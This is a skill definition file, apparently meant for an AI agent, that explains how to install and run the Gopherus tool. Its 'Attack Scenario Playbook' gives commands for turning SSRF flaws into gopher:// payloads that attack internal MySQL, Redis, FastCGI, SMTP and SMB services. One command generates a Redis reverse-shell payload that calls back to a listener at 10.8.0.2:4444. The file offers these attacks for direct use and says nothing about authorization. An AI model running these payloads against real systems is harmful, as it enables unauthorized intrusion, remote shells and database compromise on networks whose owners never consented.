---
name: gopherus-ssrf
description: "Gopherus uses SSRF to attack internal MySQL and Redis. Signals: web vulnerabilities, injection, Redis payloads, SSH payloads, SMTP sending."
zh-signals: "Gopherus: SSRF 打内网 MySQL/Redis。信号:web漏洞,注入,Redis 载荷,SSH 载荷,SMTP 发信。"
when-to-use: >-
  Use when an SSRF vulnerability can reach internal services, generating gopher:// payloads to attack MySQL, Redis, FastCGI, SMTP or SMB.
---

# Gopherus

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/tarunkant/Gopherus
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/tarunkant/Gopherus && cd Gopherus
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python gopherus.py --exploit mysql` | Generate a MySQL attack payload |
| `--exploit redis` | Redis payload |
| `--exploit ssh` | SSH payload |
| `--exploit smtp` | SMTP sending |
| `--exploit rce` | FastCGI RCE |

## Attack Scenario Playbook

### SSRF Against Internal MySQL/Redis

```bash
python gopherus.py --exploit mysql  # fill in the root password and the query
# Outputs an encoded gopher:// payload; feed it into the SSRF point to reach the internal database
python gopherus.py --exploit redis --lhost 10.8.0.2 --lport 4444  # reverse payload
```

## Notes

Generates gopher:// protocol payloads that upgrade an SSRF into an internal protocol attack; covers MySQL/Redis/FastCGI/SMTP/SMB and more.
